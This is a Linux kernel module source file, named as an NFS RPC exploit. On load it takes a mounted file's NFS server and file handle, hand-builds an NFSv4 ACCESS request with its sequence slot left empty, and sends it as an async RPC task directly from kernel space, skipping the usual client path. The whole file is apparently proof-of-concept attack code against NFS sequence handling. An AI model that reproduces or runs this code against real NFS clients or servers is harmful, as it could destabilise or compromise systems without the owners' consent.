#include <linux/module.h>
#include <linux/init.h>

#include "simple_access_exploit.h"

//#include <linux/jiffies.h>
MODULE_LICENSE("GPL");

static void init_sequence(struct nfs4_sequence_args *args,
                struct nfs4_sequence_res *res, int cache_reply)
{
	args->sa_slot = NULL;
	args->sa_cache_this = cache_reply;
	args->sa_privileged = 0;

	res->sr_slot = NULL;
}

static int __init nfs_rpc_exploit_init(void)
{
	int err;
	int status;
	struct path path;
	struct nfs_server *server;
	//it has to exist, because from this file we get nfs server
	char file_name[] = "/mnt/temp_file";
	struct nfs4_accessres res = {};
	struct nfs4_accessargs args = {};
	struct rpc_message msg = {};
	struct rpc_task *task;
	struct rpc_task_setup task_setup_data = {};
	struct nfs4_call_sync_data data = {};
	struct rpc_procinfo *procedures;

	err = kern_path(file_name, LOOKUP_FOLLOW, &path);
	if (err) {
		printk("file didn't found\n");
		return err; 
	}
	server = NFS_SERVER((path.dentry)->d_inode);

	res.server = server;
	res.fattr = nfs_alloc_fattr();
	if (res.fattr == NULL)
		return -ENOMEM;

	args.fh = NFS_FH((path.dentry)->d_inode);
	args.bitmask = server->cache_consistency_bitmask;
	args.access = NFS4_ACCESS_READ;

	if(!(procedures = server->nfs_client->cl_rpcclient->cl_procinfo)){
		printk("no procedures\n");
		return -1;
	}
	msg.rpc_proc = &procedures[NFSPROC4_CLNT_ACCESS];
	msg.rpc_argp = &args;
	msg.rpc_resp = &res;
	msg.rpc_cred = rpc_lookup_cred();

	data.seq_server = server;
	data.seq_args = &args.seq_args;
	data.seq_res = &res.seq_res;

	task_setup_data.rpc_client = server->client;
	task_setup_data.rpc_message = &msg;
	task_setup_data.callback_ops = server->nfs_client->cl_mvops->call_sync_ops;
	task_setup_data.callback_data = &data;
	task_setup_data.workqueue = nfsiod_workqueue;
	task_setup_data.flags = RPC_TASK_ASYNC;

	init_sequence(&args.seq_args, &res.seq_res, 0);
	//set_current_state(TASK_INTERRUPTIBLE);
	//schedule_timeout(msecs_to_jiffies(5000));
	task = rpc_run_task(&task_setup_data);

	if (IS_ERR(task)){
		printk("bad task\n");
		kfree(res.fattr);
		return PTR_ERR(task);
	}
	status = rpc_wait_for_completion_task(task);
	kfree(res.fattr);
	rpc_put_task(task);

	return 0;
}

static void __exit nfs_rpc_exploit_exit(void)
{
}

module_init(nfs_rpc_exploit_init);
module_exit(nfs_rpc_exploit_exit);